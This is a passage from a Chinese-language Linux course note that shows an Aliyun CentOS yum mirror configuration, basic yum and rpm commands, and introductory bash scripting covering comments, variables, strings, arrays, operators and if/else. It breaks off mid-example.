you, as a fall back you can try the \r\n# remarked out baseurl= line instead.\r\n#\r\n#\r\n \r\n[base]\r\nname=CentOS-$releasever - Base - mirrors.aliyun.com\r\nfailovermethod=priority\r\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/os/$basearch/\r\n        http://mirrors.aliyuncs.com/centos/$releasever/os/$basearch/\r\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/os/$basearch/\r\ngpgcheck=1\r\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\r\n \r\n#released updates \r\n[updates]\r\nname=CentOS-$releasever - Updates - mirrors.aliyun.com\r\nfailovermethod=priority\r\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/updates/$basearch/\r\n        http://mirrors.aliyuncs.com/centos/$releasever/updates/$basearch/\r\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/updates/$basearch/\r\ngpgcheck=1\r\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\r\n \r\n#additional packages that may be useful\r\n[extras]\r\nname=CentOS-$releasever - Extras - mirrors.aliyun.com\r\nfailovermethod=priority\r\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/\r\n        http://mirrors.aliyuncs.com/centos/$releasever/extras/$basearch/\r\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/extras/$basearch/\r\ngpgcheck=1\r\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\r\n \r\n#additional packages that extend functionality of existing packages\r\n[centosplus]\r\nname=CentOS-$releasever - Plus - mirrors.aliyun.com\r\nfailovermethod=priority\r\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/centosplus/$basearch/\r\n        http://mirrors.aliyuncs.com/centos/$releasever/centosplus/$basearch/\r\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/centosplus/$basearch/\r\ngpgcheck=1\r\nenabled=0\r\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\r\n \r\n#contrib - packages by Centos Users\r\n[contrib]\r\nname=CentOS-$releasever - Contrib - mirrors.aliyun.com\r\nfailovermethod=priority\r\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/contrib/$basearch/\r\n        http://mirrors.aliyuncs.com/centos/$releasever/contrib/$basearch/\r\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/contrib/$basearch/\r\ngpgcheck=1\r\nenabled=0\r\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\r\n```\r\n\r\n如上面的命令，之前是【CentOS】，现在是【aliyun】\r\n\r\n**4) 重新加载yum**\r\n\r\n```shell\r\nyum clean all\r\n```\r\n\r\n清理之前（CentOS）的缓存\r\n\r\n执行效果如下\r\n\r\n![1576838137800](./img/linux/java-linux/Linux-v10-02天-授课/1576838137800.png)\r\n\r\n```shell\r\nyum makecache\r\n```\r\n\r\n就是把服务器的包信息下载到本地电脑缓存起来，makecache建立一个缓存，以后用install时就在缓存中搜索，提高了速度。\r\n\r\n执行效果如下\r\n\r\n![1576838150825](./img/linux/java-linux/Linux-v10-02天-授课/1576838150825.png)\r\n\r\n如上图，元数据缓存已建立,缓存成功。\r\n\r\n**5、验证yum源使用**\r\n\r\n```shell\r\nyum search tomcat\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576836672011](./img/linux/java-linux/Linux-v10-02天-授课/1576836672011.png)\r\n\r\n如上图所示，我们发现，现在查找软件信息使用了上面的yum缓存。\r\n\r\nLoading mirror speeds from cached hostfile(从缓存的主机文件加载镜像速度)\r\n * base: mirrors.aliyun.com\r\n * extras: mirrors.aliyun.com\r\n * updates: mirrors.aliyun.com\r\n\r\n> 总结\r\n>\r\n> yum -y install 软件包\r\n>\r\n> 卸载软件\r\n> yum -y remove 软件包\r\n>\r\n> 查找软件\r\n>\r\n> yum list *\r\n>\r\n> yum源\r\n>\r\n> 版本:\r\n>\r\n> 比如我们使用的是CentOS7，在下载CentOS-Base.repo的时候要注意它的版本。\r\n\r\n## 4.2 rpm使用\r\n\r\n```\r\nRPM包管理类似于windows下的“添加/删除程序”但是功能却比“添加/删除程序”强大很多\r\n```\r\n\r\n**1、rpm介绍**\r\n\r\nrpm(redhat package manager) 原本是 Red Hat Linux 发行版专门用来管理 Linux 各项套件的程序，由于它遵循 GPL 规则且功能强大方便，因而广受欢迎。逐渐受到其他发行版的采用。RPM 套件管理方式的出现，让 Linux 易于安装，升级，间接提升了 Linux 的适用度。\r\n\r\n**2、rpm与yum区别**\r\n\r\nrpm 只能安装已经下载到本地机器上的rpm 包. yum能在线下载并安装rpm包,能更新系统,且还能自动处理包与包之间的依赖问题,这个是rpm 工具所不具备的。\r\n\r\n语法如下：\r\n\r\n```shell\r\n用法: rpm [选项...]\r\n```\r\n\r\n**rpm包**\r\n\r\n![1577255859260](./img/linux/java-linux/Linux-v10-02天-授课/1577255859260.png)\r\n\r\n> 注意：\r\n>\r\n> 以上为扩展名为.rpm的包\r\n>\r\n> 可以理解成是Windows中的.exe文件\r\n\r\n**安装rpm软件包**\r\n\r\n```shell\r\nrpm -ivh 软件全包名\r\n```\r\n\r\n**卸载rpm软件包**\r\n\r\n```shell\r\nrpm -e 软件全包名      \r\n```\r\n\r\n**列出所有安装过的包**\r\n\r\n```shell\r\nrpm -qa\r\n```\r\n\r\n**查询软件包信息**\r\n\r\n```shell\r\nrpm -qi 软件全包名\r\n```\r\n\r\n**查看文件安装位置** \r\n\r\n```shell\r\nrpm -ql 软件全包名\r\n```\r\n\r\n## 4.3 shell使用\r\n\r\n```\r\nshell脚本类似于我们在Windows中编写的批处理文件，它的扩展名是.bat，比如我们启动Tomcat（后面的课程我们会详细讲解）的时候经常启动的startup.bat，就是Windows下的批处理文件。\r\n而在Linux中，shell脚本编写的文件是以.sh结尾的。比如Tomcat下我们经常使用startup.sh来启动我们的Tomcat，这个startup.sh文件就是shell编写的。\r\n```\r\n\r\n### 4.3.1 shell入门\r\n\r\n```\r\n通过简单的学习，我们编写一个简单的入门shell程序。\r\n我们通过前面学习的echo命令，在shell脚本中打印出一句话。\r\n```\r\n\r\n**1) 什么是shell**\r\n\r\nShell 脚本（shell script），是一种为 shell 编写的脚本程序。\r\n\r\n[Shell](https://www.leiue.com/tags/shell) [脚本](https://www.leiue.com/tags/脚本)（[Shell Script](https://www.leiue.com/tags/shell-script)）又称 Shell 命令稿、程序化脚本，是一种计算机程序使用的文本文件，内容由一连串的 shell 命令组成，经由 Unix Shell 直译其内容后运作\r\n\r\n![1576838959401](./img/linux/java-linux/Linux-v10-02天-授课/1576838959401.png)\r\n\r\n\r\n\r\nShell 被当成是一种脚本语言来设计，其运作方式与解释型语言相当，由 Unix shell 扮演命令行解释器的角色，在读取 shell 脚本之后，依序运行其中的 shell 命令，之后输出结果。利用 shell 脚本可以进行系统管理，文件操作等。\r\n\r\n在 Unix 及所有的系统中，如 Linux、FreeBSD 等操作系统，都存在 shell 脚本。依照 Unix shell 的各种不同类型，shell 脚本也有各种不同方言。在 DOS、OS/2、Microsoft Windows 中的批处理文件，跟 shell 脚本有类似的功能。\r\n\r\n**2) shell环境**\r\n\r\n```\r\njava需要虚拟机解释器, 同理 shell脚本也需要解释器\r\n```\r\n\r\nShell 编程跟 JavaScript、php 编程一样，只要有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以了。\r\n\r\n**查看解释器**\r\n\r\n```shell\r\ncat /etc/shells\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577068054836](./img/linux/java-linux/Linux-v10-02天-授课/1577068054836.png)\r\n\r\nLinux 的 Shell 种类众多，常见的有：\r\n\r\n- Bourne Shell（/usr/bin/sh或/bin/sh）\r\n- Bourne Again Shell（/bin/bash）\r\n- C Shell（/usr/bin/csh）\r\n- K Shell（/usr/bin/ksh）\r\n- Shell for Root（/sbin/sh）\r\n\r\n- 等等……\r\n\r\n我们当前课程使用的是 Bash，也就是 Bourne Again Shell，由于易用和免费，Bash 在日常工作中被广泛使用。同时，Bash 也是大多数Linux 系统默认的 Shell\r\n\r\n**3) 编写第一个shell**\r\n\r\n现在，我们打开文本编辑器(我们也可以使用 vi/vim 命令来创建文件)，新建一个文件 czbk.sh，扩展名为 sh（sh代表shell）：\r\n\r\n```shell\r\n#!/bin/bash  --- 指定脚本解释器\r\necho "你好，传智播客 !"\r\n```\r\n\r\n//写shell的习惯 第一行指定解释器\r\n\r\n//文件是sh为后缀名\r\n\r\n//括号成对书写\r\n\r\n//注释的时候尽量不用中文注释。不友好。\r\n\r\n//[] 括号两端要要有空格。  [ neirong ]\r\n\r\n//习惯代码索引，增加阅读性\r\n\r\n//写语句的时候，尽量写全了，比如if。。。\r\n\r\n1、创建sh文件**\r\n\r\n```shell\r\nvim czbk.sh\r\n```\r\n\r\n**2、编写并保存**\r\n\r\n![1576839380199](./img/linux/java-linux/Linux-v10-02天-授课/1576839380199.png)\r\n\r\n**3、查看czbk.sh文件**\r\n\r\n```shell\r\nls -l\r\n```\r\n\r\n![1576839550390](./img/linux/java-linux/Linux-v10-02天-授课/1576839550390.png)\r\n\r\n如上图，我们发现刚刚编写的czbk.sh文件的的权限是【-rw-rw-r--】，通过我们之前学过的知识，我们发现这个文件并没有执行的权限\r\n\r\n我们需要将czbk.sh文件设置下它的执行权限【x】，如果不设置有执行权限，当前的文件不具备文件执行的能力。\r\n\r\n**通过chmod设置执行权限**\r\n\r\n```shell\r\nchmod +x ./czbk.sh\r\n```\r\n\r\n执行效果如下\r\n\r\n![1576839765609](./img/linux/java-linux/Linux-v10-02天-授课/1576839765609.png)\r\n\r\n我们发现，czbk.sh拥有了【x】执行权限\r\n\r\n下面，我们就开始执行czbk.sh\r\n\r\n**4、执行czbk.sh文件** --- bash a.sh0\r\n\r\n```shell\r\n ./czbk.sh \r\n```\r\n\r\n执行效果如下：\r\n\r\n![1576839880567](./img/linux/java-linux/Linux-v10-02天-授课/1576839880567.png)\r\n\r\n如上图，我们刚刚编写的shell在执行的时候正常打印出来了，说明czbk.sh具备执行的能力\r\n\r\n> 注意：\r\n>\r\n> **#!** 是一个约定的标记，它告诉系统这个脚本需要什么解释器来执行，即使用哪一种 Shell。\r\n>\r\n> echo 命令用于向窗口输出文本。\r\n\r\n### 4.3.2 shell注释\r\n\r\n```\r\n引子：\r\n在Java SE课程中，我们也学习了注释\r\n比如单行注释我们使用双斜杠//\r\n   多行注释我们使用/**开头表示注释多行\r\n而在shell编程中，我们同样也要有注释，注释掉程序中不用的脚本\r\n```\r\n\r\n**1、单行注释**\r\n\r\n以 **#** 开头的行就是注释，会被解释器忽略。\r\n\r\n通过每一行加一个 **#** 号设置多行注释，如下：\r\n\r\n```shell\r\n#--------------------------------------------\r\n# 这是一个注释\r\n#--------------------------------------------\r\n##### 开始 #####\r\n#\r\n#\r\n# 这里可以添加脚本描述信息\r\n# \r\n#\r\n##### 结束  #####\r\n```\r\n\r\n如果在开发过程中，遇到大段的代码需要临时注释起来，过一会儿又取消注释，怎么办呢？\r\n\r\n每一行加个#符号太费力了，此时，我们可以通过EOF进行多行注释，如下：\r\n\r\n**2、多行注释**\r\n\r\n多行注释还可以使用以下格式：\r\n\r\n```shell\r\n:<<EOF\r\n注释内容...\r\n注释内容...\r\n注释内容...\r\nEOF\r\n```\r\n\r\nEOF 也可以使用其他符号:\r\n\r\n```shell\r\n:<<\'\r\n注释内容...\r\n注释内容...\r\n注释内容...\r\n\'\r\n\r\n:<<!\r\n注释内容...\r\n注释内容...\r\n注释内容...\r\n!\r\n```\r\n\r\n> 总结：\r\n>\r\n> 我们将在下面的小章节中使用注释，查看注释效果\r\n\r\n### 4.3.3 shell变量\r\n\r\n```\r\n引子：\r\n这里的变量我们可以理解为我们在Java SE阶段定义的变量，比如在SE中我定义一个字符串类型的变量使用String stringStr="";\r\n\r\n注意：下面的演示我们还是继续沿用test-shell.sh进行测试\r\n```\r\n\r\n**1、定义变量:**\r\n\r\n```\r\nvariable_name="czbk"\r\n```\r\n\r\n变量名和等号之间不能有空格，这可能和你熟悉的所有编程语言都不一样。同时，变量名的命名须遵循如下规则：\r\n\r\n- 命名只能使用英文字母，数字和下划线，首个字符不能以数字开头。\r\n- 中间不能有空格，可以使用下划线（_）。\r\n- 不能使用标点符号。\r\n- 不能使用bash里的关键字（可用help命令查看保留关键字）。\r\n\r\n有效的 Shell 变量名示例如下：\r\n\r\n```shell\r\nRUNOOB\r\nLD_LIBRARY_PATH\r\n_var\r\nvar2\r\n```\r\n\r\n无效的变量命名：\r\n\r\n```shell\r\n?var=123\r\nuser*name=runoob\r\n```\r\n\r\n------\r\n\r\n**2、使用变量**\r\n\r\n使用一个定义过的变量，只要在变量名前面加美元符号即可，如：\r\n\r\n```shell\r\nvariable_name="czbk"\r\necho $variable_name\r\necho ${variable_name}\r\n```\r\n\r\n 执行效果如下\r\n\r\n![1577175492599](./img/linux/java-linux/Linux-v10-02天-授课/1577175492599.png)\r\n\r\n变量名外面的花括号是可选的，加不加都行，加花括号是为了帮助解释器识别变量的边界，比如下面这种情况：\r\n\r\n```shell\r\n echo "I am good at ${shell-t}Script"\r\n```\r\n\r\n通过上面的脚本我们发现，如果不给shell-t变量加花括号，写成echo "I am good at $shell-tScript"，解释器shell就会把$shell-tScript当成一个变量，由于我们前面没有定义shell-t变量，那么解释器执行执行的结果自然就为空了。这里我们推荐给所有变量加上花括号，这也是一个好的编程习惯。\r\n\r\n已定义的变量，可以被重新定义，如：\r\n\r\n```shell\r\nyour_name="tom"\r\necho $your_name\r\nyour_name="frank"\r\necho $your_name\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1577175655898](./img/linux/java-linux/Linux-v10-02天-授课/1577175655898.png)\r\n\r\n这样写是合法的，但注意，第二次赋值的时候不能写$your_name="frank"，使用变量的时候才加$。\r\n\r\n**3、只读变量**\r\n\r\n```\r\n这里的只读变量其实有点类似于我们在java se阶段课程中定义的final变量，即在程序的上下文中不允许被程序修改\r\n```\r\n\r\n使用 readonly 命令可以将变量定义为只读变量，只读变量的值不能被改变。\r\n\r\n下面的例子尝试更改只读变量，结果报错：\r\n\r\n```shell\r\n#!/bin/bash\r\nmyUrl="https://www.baidu.com"\r\nreadonly myUrl\r\nmyUrl="https://cn.bing.com/"\r\n```\r\n\r\n 执行效果如下图\r\n\r\n![1577175714493](./img/linux/java-linux/Linux-v10-02天-授课/1577175714493.png)\r\n\r\n**4、删除变量**\r\n\r\n使用 unset 命令可以删除变量。语法：\r\n\r\n```\r\nunset variable_name\r\n```\r\n\r\n变量被删除后不能再次使用。unset 命令不能删除只读变量。\r\n\r\n**示例如下**\r\n\r\n```shell\r\n#!/bin/sh\r\nmyUrl="https://www.baidu.com"\r\nunset myUrl\r\necho $myUrl\r\n```\r\n\r\n执行效果如下图\r\n\r\n![1577175804257](./img/linux/java-linux/Linux-v10-02天-授课/1577175804257.png)\r\n\r\n如上面的shell脚本，我们定义了一个myUrl变量，通过unset删除这个变量，然后通过echo进行输出，结果是就是为空，没有任何的结果输出。\r\n\r\n------\r\n\r\n**Shell 字符串**\r\n\r\n```\r\n字符串是shell编程中最常用也是最有用的数据类型，字符串可以用单引号，也可以用双引号，也可以不用引号，正如我们开篇提到的，在Java SE中我们定义一个字符串可以通过Stirng  stringStr=“abc" 双引号的形式进行定义，而在shel中也是可以的。\r\n```\r\n\r\n**单引号**\r\n\r\n```shell\r\nstr=\'this is a string variable\'\r\n```\r\n\r\n单引号字符串的限制：\r\n\r\n- 单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的；\r\n- 单引号字串中不能出现单独一个的单引号（对单引号使用转义符后也不行），但可成对出现，作为字符串拼接使用。\r\n\r\n**双引号**\r\n\r\n```shell\r\nyour_name=\'frank\'\r\nstr="Hello,  \\"$your_name\\"! \\n"\r\necho -e $str\r\n```\r\n\r\n输出结果为：\r\n\r\n![1577175850350](./img/linux/java-linux/Linux-v10-02天-授课/1577175850350.png)\r\n\r\n双引号的优点：\r\n\r\n- 双引号里可以有变量\r\n- 双引号里可以出现转义字符\r\n\r\n**拼接字符串**\r\n\r\n```shell\r\nyour_name="frank"\r\n# 使用双引号拼接\r\ngreeting="hello, "$your_name" !"\r\ngreeting_1="hello, ${your_name} !"\r\necho $greeting  $greeting_1\r\n```\r\n\r\n输出结果为：\r\n\r\n![1577175902317](./img/linux/java-linux/Linux-v10-02天-授课/1577175902317.png)\r\n\r\n**获取字符串长度**\r\n\r\n```shell\r\nstring="czbk"\r\necho ${#string}\r\n```\r\n\r\n输出结果：4.表示长度为4\r\n\r\n![1577175975730](./img/linux/java-linux/Linux-v10-02天-授课/1577175975730.png)\r\n\r\n**提取字符串**\r\n\r\n以下实例从字符串第 **2** 个字符开始截取 **4** 个字符：\r\n\r\n```shell\r\nstring="abcdefghijklmn"\r\necho ${string:1:4} \r\n```\r\n\r\n 执行效果如下\r\n\r\n![1577176031872](./img/linux/java-linux/Linux-v10-02天-授课/1577176031872.png)\r\n\r\n输出为【bcde】，通过截取我们发现，它的下标和我们在java中的读取方式是一样的，下标也是从0开始。\r\n\r\n### 4.3.4 shell数组\r\n\r\n```\r\n这里的数组和我们在Java SE阶段的数组结果（或是性质）是一样的，只是定义的过程大同小异\r\n```\r\n\r\nbash支持一维数组（不支持多维数组），并且没有限定数组的大小。\r\n\r\n**定义数组**\r\n\r\n在 Shell 中，用括号来表示数组，数组元素用"空格"符号分割开。如下：\r\n\r\n```shell\r\n数组名=(值1 值2 ... 值n)\r\n```\r\n\r\n例如：\r\n\r\n```shell\r\narray_name=(value0 value1 value2 value3)\r\n```\r\n\r\n或者\r\n\r\n```shell\r\narray_name=(\r\nvalue0\r\nvalue1\r\nvalue2\r\nvalue3\r\n)\r\n```\r\n\r\n通过下标定义数组中的其中一个元素：\r\n\r\n```shell\r\narray_name[0]=value0\r\narray_name[1]=value1\r\narray_name[n]=valuen\r\n```\r\n\r\n可以不使用连续的下标，而且下标的范围没有限制。\r\n\r\n**读取数组**\r\n\r\n读取数组元素值的一般格式是：\r\n\r\n```shell\r\n${数组名[下标]}\r\n```\r\n\r\n例如：\r\n\r\n```shell\r\nvaluen=${array_name[n]}\r\n```\r\n\r\n使用 **@** 符号可以获取数组中的所有元素，例如：\r\n\r\n```shell\r\necho ${array_name[@]}\r\n```\r\n\r\n**获取数组的长度**\r\n\r\n获取数组长度的方法与获取字符串长度的方法相同，例如：\r\n\r\n```shell\r\n# 取得数组元素的个数\r\nlength=${#array_name[@]}\r\n# 或者\r\nlength=${#array_name[*]}\r\n```\r\n\r\n下面，我们通过一个例子，定义数组、提取数组元素的例子来验证下\r\n\r\n```shell\r\n#! /bin/bash\r\ng=(a b c d e f)\r\necho "数组下标为2的数据为:" ${g[2]}\r\necho  "数组所有数据为:"  ${#g[@]}\r\necho  "数组所有数据为:"   ${#g[*]}\r\n```\r\n\r\n如下\r\n\r\n![1577067300329](./img/linux/java-linux/Linux-v10-02天-授课/1577067300329.png)\r\n\r\n 执行效果如下：\r\n\r\n![1577067402285](./img/linux/java-linux/Linux-v10-02天-授课/1577067402285.png)\r\n\r\n### 4.3.5 shell运算符\r\n\r\n```\r\n我们在前面课程中学习Java SE中也学到了运算符，比如算术、关系、布尔等，而在sehll编程中同样也有运算符，虽然表达的方式不一样，但是最终的目的都是一样的，都是为了解决编程中现存问题\r\n```\r\n\r\nShell 和其他编程一样，**支持**包括：算术、关系、布尔、字符串等运算符。\r\n\r\n原生 bash **不支持 **简单的数学运算，但是可以通过其他命令来实现，例如expr。\r\n\r\nexpr 是一款表达式计算工具，使用它能完成表达式的求值操作。\r\n\r\n例如，两个数相加,我们还是利用上面的例子test-shell.sh \r\n\r\n**1、算数运算符**\r\n\r\n```\r\nval=`expr 2 + 2`\r\necho "相加之后的结果为：" $val\r\n```\r\n\r\n 执行效果如下\r\n\r\n![1577068429739](./img/linux/java-linux/Linux-v10-02天-授课/1577068429739.png)\r\n\r\n注意：\r\n\r\n**表达式和运算符之间要有空格**，例如 2+2 是不对的，必须写成 2 + 2。\r\n\r\n完整的表达式要被 **`** 包含，注意不是单引号。\r\n\r\n下表列出了常用的算术运算符，假定变量 a 为 10，变量 b 为 20：\r\n\r\n| **运算符** | **说明**                                      | **举例**                      |\r\n| ---------- | --------------------------------------------- | ----------------------------- |\r\n| +          | 加法                                          | `expr $a + $b` 结果为 30。    |\r\n| -          | 减法                                          | `expr $a - $b` 结果为 -10。   |\r\n| *          | 乘法                                          | `expr $a \\* $b` 结果为  200。 |\r\n| /          | 除法                                          | `expr $b / $a` 结果为 2。     |\r\n| %          | 取余                                          | `expr $b % $a` 结果为 0。     |\r\n| =          | 赋值                                          | a=$b 将把变量 b 的值赋给 a。  |\r\n| ==         | 相等。用于比较两个数字，相同则返回 true。     | [ $a == $b ] 返回 false。     |\r\n| !=         | 不相等。用于比较两个数字，不相同则返回 true。 | [ $a != $b ] 返回 true。      |\r\n\r\n**注意：**条件表达式要放在方括号之间，并且要有空格，例如: **[$a==$b]** 是错误的，必须写成 **[ $a == $b ]**。\r\n\r\n下面是运算符shell脚本（还是采用之前的例子test-shell.sh ）w\r\n\r\n```shell\r\n#! /bin/bash\r\n#g=(a b c d e f)\r\n#echo "数组下标为2的数据为:" ${g[2]}\r\n#echo  "数组所有数据为:"  ${#g[@]}\r\n#echo  "数组所有数据为:"   ${#g[*]}\r\n:<<EOF\r\nval= `expr 2 + 2`\r\necho "相加之后的结果为：" $val\r\nEOF\r\n\r\na=4\r\nb=20\r\necho “加法运算”  `expr $a + $b`\r\necho “减法运算”  `expr $a - $b`\r\necho “乘法运算，注意*号前面需要反斜杠” ` expr $a \\* $b`\r\necho “除法运算”  `expr  $b / $a`\r\n((a++))\r\necho "a = $a"\r\nc=$((a + b)) \r\nd=$[a + b]\r\necho "c = $c"\r\necho "d = $d"\r\n```\r\n\r\n**上面的shell命令#开头的为单行注释**\r\n\r\n**:<<EOF 开头和EOF结尾的为多行注释**\r\n\r\n执行效果如下\r\n\r\n![1577152161538](./img/linux/java-linux/Linux-v10-02天-授课/1577152161538.png)\r\n\r\n**2、字符串运算符**\r\n\r\n下表列出了常用的字符串运算符，假定变量 a 为 "abc"，变量 b 为 "efg"：\r\n\r\n| 运算符 | 说明                                      | 举例                     |\r\n| :----- | :---------------------------------------- | :----------------------- |\r\n| =      | 检测两个字符串是否相等，相等返回 true。   | [ $a = $b ] 返回 false。 |\r\n| !=     | 检测两个字符串是否相等，不相等返回 true。 | [ $a != $b ] 返回 true。 |\r\n| -z     | 检测字符串长度是否为0，为0返回 true。     | [ -z $a ] 返回 false。   |\r\n| -n     | 检测字符串长度是否为0，不为0返回 true。   | [ -n "$a" ] 返回 true。  |\r\n| $      | 检测字符串是否为空，不为空返回 true。     | [ $a ] 返回 true。       |\r\n\r\n**字符串运算符实例如下（还是采用之前的例子test-shell.sh ）：**\r\n\r\n```shell\r\na="abc"\r\nb="efg"\r\n\r\nif [ $a = $b ]\r\nthen\r\n   echo "$a = $b : a 等于 b"\r\nelse\r\n   echo "$a = $b: a 不等于 b"\r\nfi\r\nif [ $a != $b ]\r\nthen\r\n   echo "$a != $b : a 不等于 b"\r\nelse\r\n   echo "$a != $b: a 等于 b"\r\nfi\r\n \r\n```\r\n\r\n 执行效果如下\r\n\r\n![1577158474734](./img/linux/java-linux/Linux-v10-02天-授课/1577158474734.png)\r\n\r\n**3、关系运算符**\r\n\r\n关系运算符只支持数字，不支持字符串，除非字符串的值是数字。\r\n\r\n下表列出了常用的关系运算符，假定变量 a 为 10，变量 b 为 20：\r\n\r\n| 运算符 | 说明                                                  | 举例                       |\r\n| :----- | :---------------------------------------------------- | :------------------------- |\r\n| -eq    | 检测两个数是否相等，相等返回 true。                   | [ $a -eq $b ] 返回 false。 |\r\n| -ne    | 检测两个数是否不相等，不相等返回 true。               | [ $a -ne $b ] 返回 true。  |\r\n| -gt    | 检测左边的数是否大于右边的，如果是，则返回 true。     | [ $a -gt $b ] 返回 false。 |\r\n| -lt    | 检测左边的数是否小于右边的，如果是，则返回 true。     | [ $a -lt $b ] 返回 true。  |\r\n| -ge    | 检测左边的数是否大于等于右边的，如果是，则返回 true。 | [ $a -ge $b ] 返回 false。 |\r\n| -le    | 检测左边的数是否小于等于右边的，如果是，则返回 true。 | [ $a -le $b ] 返回 true。  |\r\n\r\n**关系运算符（还是采用之前的例子test-shell.sh ）**\r\n\r\n```shell\r\na=10\r\nb=20\r\n\r\nif [ $a -eq $b ]\r\nthen\r\n   echo "$a -eq $b : a 等于 b"\r\nelse\r\n   echo "$a -eq $b: a 不等于 b"\r\nfi\r\nif [ $a -ne $b ]\r\nthen\r\n   echo "$a -ne $b: a 不等于 b"\r\nelse\r\n   echo "$a -ne $b : a 等于 b"\r\nfi\r\nif [ $a -gt $b ]\r\nthen\r\n   echo "$a -gt $b: a 大于 b"\r\nelse\r\n   echo "$a -gt $b: a 不大于 b"\r\nfi\r\nif [ $a -lt $b ]\r\nthen\r\n   echo "$a -lt $b: a 小于 b"\r\nelse\r\n   echo "$a -lt $b: a 不小于 b"\r\nfi\r\nif [ $a -ge $b ]\r\nthen\r\n   echo "$a -ge $b: a 大于或等于 b"\r\nelse\r\n   echo "$a -ge $b: a 小于 b"\r\nfi\r\nif [ $a -le $b ]\r\nthen\r\n   echo "$a -le $b: a 小于或等于 b"\r\nelse\r\n   echo "$a -le $b: a 大于 b"\r\nfi\r\n```\r\n\r\n执行效果如下：\r\n\r\n![1577169772803](./img/linux/java-linux/Linux-v10-02天-授课/1577169772803.png)\r\n\r\n**4、布尔运算符**\r\n\r\n下表列出了常用的布尔运算符，假定变量 a 为 10，变量 b 为 20：\r\n\r\n| 运算符 | 说明                                                | 举例                                     |\r\n| :----- | :-------------------------------------------------- | :--------------------------------------- |\r\n| !      | 非运算，表达式为 true 则返回 false，否则返回 true。 | [ ! false ] 返回 true。                  |\r\n| -o     | 或运算，有一个表达式为 true 则返回 true。           | [ $a -lt 20 -o $b -gt 100 ] 返回 true。  |\r\n| -a     | 与运算，两个表达式都为 true 才返回 true。           | [ $a -lt 20 -a $b -gt 100 ] 返回 false。 |\r\n\r\n**布尔运算符实例如下（还是采用之前的例子test-shell.sh ）：**\r\n\r\n```shell\r\na=10\r\nb=20\r\n\r\nif [ $a != $b ]\r\nthen\r\n   echo "$a != $b : a 不等于 b"\r\nelse\r\n   echo "$a == $b: a 等于 b"\r\nfi\r\nif [ $a -lt 100 -a $b -gt 15 ]\r\nthen\r\n   echo "$a 小于 100 且 $b 大于 15 : 返回 true"\r\nelse\r\n   echo "$a 小于 100 且 $b 大于 15 : 返回 false"\r\nfi\r\nif [ $a -lt 100 -o $b -gt 100 ]\r\nthen\r\n   echo "$a 小于 100 或 $b 大于 100 : 返回 true"\r\nelse\r\n   echo "$a 小于 100 或 $b 大于 100 : 返回 false"\r\nfi\r\nif [ $a -lt 5 -o $b -gt 100 ]\r\nthen\r\n   echo "$a 小于 5 或 $b 大于 100 : 返回 true"\r\nelse\r\n   echo "$a 小于 5 或 $b 大于 100 : 返回 false"\r\nfi\r\n\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577170810671](./img/linux/java-linux/Linux-v10-02天-授课/1577170810671.png)\r\n\r\n**5、逻辑运算符**\r\n\r\n假定变量 a 为 10，变量 b 为 20:\r\n\r\n| 运算符 | 说明       | 举例                                       |\r\n| :----- | :--------- | :----------------------------------------- |\r\n| &&     | 逻辑的 AND | [[ $a -lt 100 && $b -gt 100 ]] 返回 false  |\r\n| \\|\\|   | 逻辑的 OR  | [[ $a -lt 100 \\|\\| $b -gt 100 ]] 返回 true |\r\n\r\n**逻辑运算符实例如下（还是采用之前的例子test-shell.sh ）：** \r\n\r\n```shell\r\na=10\r\nb=20\r\n\r\nif [[ $a -lt 100 && $b -gt 100 ]]\r\nthen\r\n   echo "返回 true"\r\nelse\r\n   echo "返回 false"\r\nfi\r\n\r\nif [[ $a -lt 100 || $b -gt 100 ]]\r\nthen\r\n   echo "返回 true"\r\nelse\r\n   echo "返回 false"\r\nfi\r\n```\r\n\r\n执行效果如下\r\n\r\n![1577171478166](./img/linux/java-linux/Linux-v10-02天-授课/1577171478166.png)\r\n\r\n\r\n\r\n### 4.3.6 shell流程控制\r\n\r\n```\r\n在前面的Java SE课程中，我们学习了很多的流程控制语句，比如有if-else、if else-if else、switch、for、while等语句；\r\n在shell编程中，我们同样也有这些流程控制，只是语法和java SE有所区别，但是目的是一样的。\r\n```\r\n\r\n**1、if 语句：**\r\n\r\n**主要用于判断，相当于java se中的if，我们还是采用之前的例子test-shell.sh**\r\n\r\n```shell\r\nif condition\r\nthen\r\n    command1 \r\n    command2\r\n    ...\r\n    commandN \r\nfi\r\n```\r\n\r\n 比如，我们现在通过前面学习的知识查找一个进程，如果进程存在就打印true\r\n\r\n```shell\r\nif [ $(ps -ef | grep -c "ssh") -gt 1 ]; then echo "true"; fi\r\n```\r\n\r\n> 注意\r\n>\r\n> 末尾的fi就是if倒过来拼写\r\n\r\n执行效果如下\r\n\r\n![1577174880068](./img/linux/java-linux/Linux-v10-02天-授课/1577174880068.png)\r\n\r\n**2、if else 语句：**\r\n\r\n**主要用于判断，相当于java se中的if else，我们还是采用之前的例子test-shell.sh。**\r\n\r\n```shell\r\nif condition\r\nthen\r\n    command1 \r\n    command2\r\n    ...\r\n    commandN\r\nelse\r\n    command\r\nfi\r\n```\r\n\r\n上接上面的例子，如果找不到sshAAA**（此处可以随便输入一个）**进程，我们就打印false\r\n\r\n```shell\r\nif [ $(ps -ef | grep -c "sshAAA") -gt 1 ]; then echo "true";  else echo "false"; 